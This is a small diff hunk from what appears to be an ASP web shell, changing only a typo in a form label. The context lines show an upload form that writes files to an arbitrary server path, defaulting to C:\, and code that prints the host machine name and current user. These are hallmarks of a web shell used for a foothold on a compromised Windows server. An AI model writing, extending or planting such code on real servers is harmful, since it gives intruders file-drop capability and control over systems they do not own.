@@ -105,7 +105,7 @@ End If
 <FORM action="?ok=1" method="POST" ENCTYPE="multipart/form-data">
 <INPUT TYPE="file" NAME="fichero">
 <INPUT TYPE="submit" Value="Upload">
-<br>Need type fyll path without file name:<br><INPUT TYPE="text" Name="path" Value="C:\">
+<br>Need type full path without file name:<br><INPUT TYPE="text" Name="path" Value="C:\">
 </FORM>
 <PRE>
 <%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
